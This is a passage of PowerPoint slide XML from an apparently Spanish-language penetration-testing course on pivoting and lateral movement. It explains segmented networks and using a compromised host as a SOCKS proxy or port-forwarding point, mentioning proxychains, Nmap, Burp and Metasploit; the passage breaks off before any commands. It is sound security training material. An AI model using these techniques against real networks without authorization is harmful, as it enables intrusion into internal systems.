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0"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId21"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="257" r:id="rId5"/>
    <p:sldId id="268" r:id="rId6"/>
    <p:sldId id="277" r:id="rId7"/>
    <p:sldId id="278" r:id="rId8"/>
    <p:sldId id="279" r:id="rId9"/>
    <p:sldId id="267" r:id="rId10"/>
    <p:sldId id="263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</p:sldIdLst>
  <p:sldSz cx="12188825" cy="6858000"/>
  <p:notesSz cx="6858000" cy="9144000"/>
  <p:defaultTextStyle>
    <a:defPPr rtl="0">
      <a:defRPr lang="es-e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97" autoAdjust="0"/>
    <p:restoredTop sz="96395" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr>
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="97" d="100"/>
          <a:sy n="97" d="100"/>
        </p:scale>
        <p:origin x="77" y="53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8" d="100"/>
          <a:sy n="88" d="100"/>
        </p:scale>
        <p:origin x="2478" y="6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C8F1D84B-F747-4821-8617-FBD61E8F4308}" type="datetime1">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>09/11/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES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79429053-DC2A-4342-ADD4-2FD729D91E2C}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:pPr algn="r"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DA87C823-BB9F-45DA-99AB-416A32E1B948}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" noProof="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Marcador de posición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Haga clic para modificar el estilo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fld id="{3EBA5BD7-F043-4D1B-AA17-CD412FC534DE}" type="slidenum">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr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smtClean="0"/>
              <a:pPr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886723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smtClean="0"/>
              <a:pPr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74516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smtClean="0"/>
              <a:pPr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213173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noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>7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837636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e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Conector recto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Conector recto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Conector recto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líneas inferior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orma libre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es-ES" noProof="0" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Forma libre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es-ES" noProof="0" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="Forma libre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es-ES" noProof="0" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp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 rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l" rtl="0">
              <a:defRPr sz="54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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Marcador de posición de fecha 2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042E67D-14C0-4ED9-A218-9C14494A6A84}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" noProof="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Marcador de posición de pie de página 2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24" name="Marcador de posición de número de diapositiva 2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2E48AAE-5AE8-418A-A225-B506C222F2F9}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025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e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Conector recto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Conector recto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Conector recto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rtlCol="0" anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l" rtl="0">
              <a:defRPr sz="5400" b="0" cap="none" baseline="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rtlCol="0" anchor="t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l" rtl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A1D35CA-82F5-4AD4-B9EC-66E805B73542}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025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/>
            </a:lvl8pPr>
            <a:lvl9pPr algn="l" rtl="0">
              <a:defRPr sz="2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34CCE92-710B-4678-B1B1-EFCAA5CDF075}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES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l" rtl="0"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 baseline="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7" name="Marcador de posición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3FB0F2C-25D9-4D7E-B43A-29A2E16C960D}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" noProof="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Marcador de posición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9" name="Marcador de posición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D34687D-B11B-47A5-95F6-B79DA932A6DF}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" noProof="0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3C656DE-1E46-4450-9484-A739B4FADFBC}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" noProof="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Marcador de posición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EA77F8B-D469-4ECD-B91E-3B01AD692331}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES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3" name="Marcador de posición de imagen 2" descr="Marcador de posición vacío para agregar una imagen. Haga clic en el marcador de posición y seleccione la imagen que desee agregar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 rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="l" rtl="0">
              <a:buNone/>
              <a:defRPr sz="2800"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="609493" indent="0" algn="l" rtl="0">
              <a:buNone/>
              <a:defRPr sz="3700"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1218987" indent="0" algn="l" rtl="0">
              <a:buNone/>
              <a:defRPr sz="3200"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1828480" indent="0" algn="l" rtl="0">
              <a:buNone/>
              <a:defRPr sz="2700"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2437973" indent="0" algn="l" rtl="0">
              <a:buNone/>
              <a:defRPr sz="2700"/>
            </a:lvl5pPr>
            <a:lvl6pPr marL="3047467" indent="0" algn="l" rtl="0">
              <a:buNone/>
              <a:defRPr sz="2700"/>
            </a:lvl6pPr>
            <a:lvl7pPr marL="3656960" indent="0" algn="l" rtl="0">
              <a:buNone/>
              <a:defRPr sz="2700"/>
            </a:lvl7pPr>
            <a:lvl8pPr marL="4266453" indent="0" algn="l" rtl="0">
              <a:buNone/>
              <a:defRPr sz="2700"/>
            </a:lvl8pPr>
            <a:lvl9pPr marL="4875947" indent="0" algn="l" rtl="0">
              <a:buNone/>
              <a:defRPr sz="27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9BA7B1C-709E-4257-93A5-EC2F0807D42F}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES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 baseline="0"/>
            </a:lvl8pPr>
            <a:lvl9pPr algn="l" rtl="0">
              <a:defRPr baseline="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0A1DB83-C382-4684-8887-65A03EA4FFF0}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025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C60E81D3-9B82-44CA-B1F9-FCEFDC87935B}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025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íneas a la izquierda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orma libre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  <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="Forma libre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  <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="14" name="Forma libre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</p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Marcador de posición de título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 rtl="0"/>
            <a:r>
              <a:rPr lang="es-ES" noProof="0" dirty="0"/>
              <a:t>Editar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C83AD5-F5AF-4BDC-901E-85A05CCFFAAA}" type="datetime1">
              <a:rPr lang="es-ES" noProof="0" smtClean="0"/>
              <a:pPr/>
              <a:t>09/11/2025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r>
              <a:rPr lang="es-CL" dirty="0" err="1"/>
              <a:t>Pivotaje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t> y Movimiento Lateral</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/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596776"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-CL" dirty="0"/>
              <a:t>El Salto Invisible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MX" dirty="0"/>
              <a:t>El Problema de la Red Segmentada</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="2" name="Marcador de contenido 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35818F84-0187-F53A-A7E6-030B7D75C7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5200184"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2973480" y="1700808"/>
          <a:ext cx="6241864" cy="4462463"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3120932">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="583051493"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3120932">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3488795004"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="2754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400" dirty="0"/>
                        <a:t>Concepto</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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400" dirty="0"/>
                        <a:t>Explicación</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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024293"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1156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b="1"/>
                        <a:t>Redes Segmentadas</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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/>
                        <a:t>En entornos empresariales, los servidores importantes (bases de datos, Active Directory) no están directamente conectados a Internet. Están en redes internas ocultas.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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2998314"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="936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b="1"/>
                        <a:t>Direcciones Privadas</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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/>
                        <a:t>Los hosts internos usan direcciones no ruteables públicamente (Ej. </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>192.168.x.x</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400"/>
                        <a:t> o </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400">
                          <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>10.x.x.x</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400"/>
                        <a:t>). El atacante externo no puede "verlos".</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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5768062"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="936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b="1"/>
                        <a:t>La Necesidad del Pivote</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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/>
                        <a:t>Una vez que se compromete el primer host (el "Host Cebo"), este se convierte en nuestra puerta de enlace ("pivote") para acceder a la red interna oculta.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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9886024"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="1156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b="1"/>
                        <a:t>Definición de Pivotaje</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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dirty="0"/>
                        <a:t>Es la técnica de usar una máquina comprometida como un </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
                        <a:t>punto de </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" b="1" i="1" dirty="0"/>
                        <a:t>proxy</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
                        <a:t> o un </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" b="1" i="1" dirty="0" err="1"/>
                        <a:t>router</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" dirty="0"/>
                        <a:t> para atacar otras máquinas en un segmento de red al que el atacante no tiene acceso directo.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="55092" marR="55092" marT="27546" marB="275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3144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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FA8EBDAD-88DC-0C60-5B7A-5C9D174E5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</p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>pivot</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6146" name="Picture 2" descr="Pivoting - part 1. Practical example - cocomelonc">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{309F04EF-6120-E5E8-10C4-7EA70B916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92" r="-1" b="21958"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1218883" y="1701797"/>
            <a:ext cx="10360501" cy="4462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9756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🛠️ Port forwarding | The Hacker Recipes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10B84473-4C6A-0B5A-7530-2EB2C0E528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09836" y="1412776"/>
            <a:ext cx="10785523" cy="4902771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0195365-7BF2-04DB-5DFF-768C658CD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</p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Port forwarding</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4159123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5261A4B2-12F5-12B0-3843-8B94BFCB76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261346"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1269876" y="1052736"/>
          <a:ext cx="6912768" cy="5001155"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2304256">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1620973480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1572824662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1017869397"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="5290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b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Característica</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400">
                        <a:effectLst/>
                        <a:latin typeface="Google Sans Text"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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b="1" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Pivotaje</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="1400" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t> (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="1400" b="1" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Pivoting</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="1400" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>)</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400" dirty="0">
                        <a:effectLst/>
                        <a:latin typeface="Google Sans Text"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Redirección de Puertos (Port Forwarding)</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-MX" sz="1400">
                        <a:effectLst/>
                        <a:latin typeface="Google Sans Text"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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7669359"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="14713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b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Definición</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400">
                        <a:effectLst/>
                        <a:latin typeface="Google Sans Text"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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>
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Utilizar el host comprometido como un </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>puente o proxy SOCKS</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t> para tunelizar todo tu tráfico hacia una </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>subred</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t> interna.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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>
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Crear un </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>túnel directo</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t> entre un puerto de tu máquina y un </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>servicio específico</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t> en el host interno.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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79059"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="10002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b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Alcance</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400">
                        <a:effectLst/>
                        <a:latin typeface="Google Sans Text"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Amplio.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t> Accedes a toda la red interna oculta (Ej. 10.10.10.0/24).</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Estrecho.</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="1400">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t> Accedes únicamente al servicio configurado (Ej. solo RDP 3389).</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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2483223"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="10002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b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Herramientas</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400">
                        <a:effectLst/>
                        <a:latin typeface="Google Sans Text"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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>
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Requiere herramientas que soporten SOCKS (Ej. proxychains con Nmap o Burp).</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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>
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Requiere solo el cliente del servicio (Ej. tu cliente RDP se conecta a 127.0.0.1:&lt;puerto&gt;).</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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213292"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="10002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b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Cuándo usarlo</a:t>
                      </a:r>
                      <a:endParaRPr lang="es-CL" sz="1400">
                        <a:effectLst/>
                        <a:latin typeface="Google Sans Text"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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>
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Cuando necesitas </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400" b="1">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>escanear y atacar múltiples hosts</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-MX" sz="1400">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t> en la red interna.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>Cuando necesitas acceder a </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="1400" b="1" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t>un servicio en un solo host</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="es-CL" sz="1400" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Google Sans Text"/>
                        </a:rPr>
                        <a:t> (Ej. RDP o SSH).</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="52500" marR="52500" marT="26250" marB="2625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004395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D66F76D7-3199-BEBE-02AF-B3354630C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836" y="428273"/>
            <a:ext cx="9788513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Estos son los dos pilares del movimiento lateral, y aunque ambos te permiten acceder a redes ocultas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su </a:t>
            </a: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alcance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y </a:t>
            </a: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mecanismo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son distintos:</a:t>
            </a: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7A9C0DE-C9D6-1AA6-9A52-729E867365A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8686700" y="2274838"/>
            <a:ext cx="338437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En resumen:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>El </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0" err="1"/>
              <a:t>Pivotaje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> es una solución </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0"/>
              <a:t>de red</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> (acceso amplio) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0"/>
              <a:t>Port </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0" err="1"/>
              <a:t>Forwarding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> es una solución </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" b="1" dirty="0"/>
              <a:t>de servicio</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> (acceso puntual).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778319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634083"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1"/>
              <a:t>Pivotaje</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t> con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" dirty="0"/>
              <a:t>: La Ruta del SOCKS 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7F74DE-31A5-F4D3-C1B8-B409C2E20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813" y="908720"/>
            <a:ext cx="11593288" cy="5832648"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" dirty="0"/>
              <a:t>Este es el método profesional, que permite canalizar </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-MX" sz="1400" b="1" dirty="0"/>
              <a:t>todo el tráfico de herramientas</a:t>
            </a:r>
            <a:r>
